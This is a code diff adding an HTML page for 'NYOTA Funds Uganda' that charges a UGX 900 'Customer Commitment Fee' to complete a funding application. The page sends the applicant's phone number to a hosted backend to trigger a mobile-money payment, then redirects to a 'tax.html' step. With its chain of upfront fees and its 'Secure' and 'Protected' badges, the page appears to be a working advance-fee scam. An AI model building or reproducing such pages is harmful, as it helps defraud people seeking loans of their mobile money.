@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#FFD100">
+<title>NYOTA Funds Uganda — Commitment Fee</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+font-family:Arial,sans-serif;
+min-height:100vh;
+padding:20px;
+display:flex;
+justify-content:center;
+align-items:center;
+background:
+radial-gradient(circle at 15% 20%,rgba(255,209,0,.35),transparent 30%),
+radial-gradient(circle at 85% 80%,rgba(245,176,0,.35),transparent 30%),
+linear-gradient(135deg,#FFD100,#F5B000);
+color:#000;
+overflow-x:hidden;
+}
+
+body::before,
+body::after{
+content:"";
+position:fixed;
+width:240px;
+height:240px;
+border-radius:50%;
+filter:blur(90px);
+z-index:-1;
+animation:moveBlob 10s ease-in-out infinite alternate;
+}
+
+body::before{
+background:#FFD100;
+top:-70px;
+left:-70px;
+}
+
+body::after{
+background:#F5B000;
+bottom:-70px;
+right:-70px;
+}
+
+@keyframes moveBlob{
+from{transform:translate(0,0);}
+to{transform:translate(20px,-20px);}
+}
+
+.container{width:100%;max-width:470px;}
+
+.card{
+background:rgba(255,255,255,.95);
+backdrop-filter:blur(16px);
+border:1px solid rgba(0,0,0,.08);
+border-radius:24px;
+padding:24px;
+box-shadow:0 25px 70px rgba(0,0,0,.35);
+}
+
+.progress{
+display:flex;
+align-items:center;
+justify-content:center;
+margin-bottom:22px;
+}
+
+.step{
+width:34px;
+height:34px;
+border-radius:50%;
+background:rgba(0,0,0,.12);
+display:flex;
+align-items:center;
+justify-content:center;
+font-weight:bold;
+}
+
+.step.active{
+background:#000;
+color:#FFD100;
+}
+
+.line{
+width:38px;
+height:3px;
+background:rgba(0,0,0,.15);
+}
+
+.line.active{
+background:#000;
+}
+
+.hero{
+text-align:center;
+font-size:55px;
+margin-bottom:10px;
+animation:float 3s ease-in-out infinite;
+}
+
+@keyframes float{
+0%,100%{transform:translateY(0);}
+50%{transform:translateY(-8px);}
+}
+
+h1{
+text-align:center;
+font-size:28px;
+margin-bottom:8px;
+color:#000;
+}
+
+.subtitle{
+text-align:center;
+color:#444;
+line-height:1.5;
+margin-bottom:22px;
+}
+
+.notice{
+background:rgba(255,209,0,.18);
+border:1px solid rgba(0,0,0,.12);
+border-radius:16px;
+padding:16px;
+font-size:14px;
+line-height:1.6;
+margin-bottom:18px;
+}
+
+.details{
+display:flex;
+flex-direction:column;
+gap:12px;
+margin-bottom:18px;
+}
+
+.row{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:14px;
+border-radius:14px;
+background:rgba(255,255,255,.7);
+border:1px solid rgba(0,0,0,.12);
+}
+
+.left{
+display:flex;
+align-items:center;
+gap:12px;
+}
+
+.icon{
+width:40px;
+height:40px;
+border-radius:12px;
+background:rgba(255,209,0,.18);
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:18px;
+}
+
+.value{
+font-weight:bold;
+}
+
+.payment-box{
+background:linear-gradient(135deg,#000,#222);
+color:#FFD100;
+border-radius:18px;
+padding:18px;
+text-align:center;
+margin-bottom:20px;
+box-shadow:0 12px 28px rgba(0,0,0,.25);
+}
+
+.payment-box small{
+display:block;
+font-size:12px;
+opacity:.9;
+}
+
+.payment-box strong{
+display:block;
+margin-top:5px;
+font-size:28px;
+}
+
+button{
+width:100%;
+padding:17px;
+border:none;
+border-radius:14px;
+background:linear-gradient(135deg,#000,#222);
+color:#FFD100;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 12px 28px rgba(0,0,0,.3);
+transition:.25s;
+}
+
+button:hover{
+transform:translateY(-2px);
+}
+
+button:disabled{
+opacity:.7;
+cursor:not-allowed;
+transform:none;
+}
+
+.spinner{
+display:none;
+width:24px;
+height:24px;
+border:3px solid rgba(0,0,0,.15);
+border-top:3px solid #000;
+border-radius:50%;
+animation:spin .8s linear infinite;
+margin:14px auto;
+}
+
+@keyframes spin{
+to{transform:rotate(360deg);}
+}
+
+#status{
+min-height:24px;
+margin-top:14px;
+text-align:center;
+padding:12px;
+border-radius:10px;
+font-size:14px;
+}
+
+.success{
+background:rgba(10,122,42,.12);
+color:#0A7A2A;
+}
+
+.error{
+background:rgba(211,47,47,.12);
+color:#D32F2F;
+}
+
+.trust{
+display:flex;
+justify-content:space-between;
+margin-top:20px;
+font-size:12px;
+color:#555;
+}
+
+.footer{
+text-align:center;
+margin-top:18px;
+color:#666;
+font-size:12px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<div class="progress">
+<div class="step active">1</div>
+<div class="line active"></div>
+
+<div class="step active">2</div>
+<div class="line active"></div>
+
+<div class="step active">3</div>
+<div class="line"></div>
+
+<div class="step">4</div>
+</div>
+
+<div class="hero">💳</div>
+
+<h1>NYOTA Funds Uganda</h1>
+
+<p class="subtitle">
+Complete your Customer Commitment Fee to finish your application.
+</p>
+
+<div class="notice">
+To complete your NYOTA Funds Uganda application, a <strong>Customer Commitment Fee of UGX 900</strong> is required. Once payment is confirmed, your application proceeds to the final stage.
+</div>
+
+<div class="details">
+
+<div class="row">
+<div class="left">
+<div class="icon">👤</div>
+<div>Applicant</div>
+</div>
+<div class="value" id="fullName">Applicant</div>
+</div>
+
+<div class="row">
+<div class="left">
+<div class="icon">📱</div>
+<div>Phone</div>
+</div>
+<div class="value" id="phone">Not available</div>
+</div>
+
+<div class="row">
+<div class="left">
+<div class="icon">💰</div>
+<div>Selected Amount</div>
+</div>
+<div class="value">UGX <span id="fund">22,000</span></div>
+</div>
+
+</div>
+
+<div class="payment-box">
+<small>Customer Commitment Fee</small>
+<strong>UGX 900</strong>
+</div>
+
+<button id="payBtn">Pay Commitment Fee →</button>
+
+<div class="spinner" id="spinner"></div>
+
+<div id="status"></div>
+
+<div class="trust">
+<span>🔒 Secure</span>
+<span>MTN & Airtel Money</span>
+<span>✔ Protected</span>
+</div>
+
+</div>
+
+<div class="footer">
+© 2026 NYOTA Funds Uganda
+</div>
+
+</div>
+
+<script>
+"use strict";
+
+const BACKEND_URL="https://momo-funds-202.onrender.com";
+const SERVICE_FEE=900;
+
+document.getElementById("fullName").textContent=
+localStorage.getItem("fullName")||
+localStorage.getItem("fullname")||
+"Applicant";
+
+document.getElementById("phone").textContent=
+localStorage.getItem("phoneNumber")||
+localStorage.getItem("phone")||
+"Not available";
+
+const amount=
+localStorage.getItem("requestedAmount")||
+localStorage.getItem("selectedAmount")||
+22000;
+
+document.getElementById("fund").textContent=
+Number(amount).toLocaleString("en-UG");
+
+const payBtn=document.getElementById("payBtn");
+const statusEl=document.getElementById("status");
+const spinner=document.getElementById("spinner");
+
+function setStatus(msg,type=""){
+statusEl.textContent=msg;
+statusEl.className=type;
+}
+
+function setLoading(state,text){
+payBtn.disabled=state;
+payBtn.textContent=state?text:"Pay Commitment Fee →";
+spinner.style.display=state?"block":"none";
+}
+
+async function readJson(res){
+const txt=await res.text();
+return txt?JSON.parse(txt):{};
+}
+
+async function payService(){
+
+const phone=
+localStorage.getItem("phoneNumber")||
+localStorage.getItem("phone");
+
+if(!phone){
+setStatus("Phone number not found.","error");
+return;
+}
+
+setLoading(true,"Sending...");
+setStatus("Sending payment request...");
+
+try{
+
+const response=await fetch(`${BACKEND_URL}/api/pay`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+phone,
+amount:SERVICE_FEE
+})
+});
+
+const data=await readJson(response);
+
+if(!response.ok||data.success===false){
+throw new Error(data.message||"Payment request failed.");
+}
+
+const transactionId=
+data.transactionId||
+data.data?.reference||
+data.reference;
+
+if(!transactionId){
+throw new Error("Transaction reference missing.");
+}
+
+setLoading(true,"Waiting...");
+setStatus("Please complete the payment on your phone.");
+
+await checkPayment(transactionId);
+
+}catch(error){
+
+setStatus(error.message,"error");
+setLoading(false);
+
+}
+
+}
+
+async function checkPayment(transactionId){
+
+const start=Date.now();
+
+while(Date.now()-start<120000){
+
+try{
+
+const response=await fetch(`${BACKEND_URL}/api/status/${transactionId}`);
+
+const result=await readJson(response);
+
+const payment=result.data||result;
+const status=String(payment.status||result.status||"").toUpperCase();
+
+if(["SUCCESS","SUCCESSFUL","COMPLETED"].includes(status)){
+setStatus("Payment confirmed. Redirecting...","success");
+setLoading(true,"Payment Confirmed");
+
+setTimeout(()=>{
+window.location.href="tax.html";
+},1000);
+
+return;
+}
+
+if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
+throw new Error("Payment "+status.toLowerCase()+".");
+}
+
+}catch(error){
+
+if(/failed|cancelled|expired/i.test(error.message)){
+setStatus(error.message,"error");
+setLoading(false);
+return;
+}
+
+}
+
+await new Promise(r=>setTimeout(r,5000));
+
+}
+
+setStatus("Payment confirmation timed out.","error");
+setLoading(false);
+}
+
+payBtn.addEventListener("click",payService);
+</script>
+
+</body>
+</html>
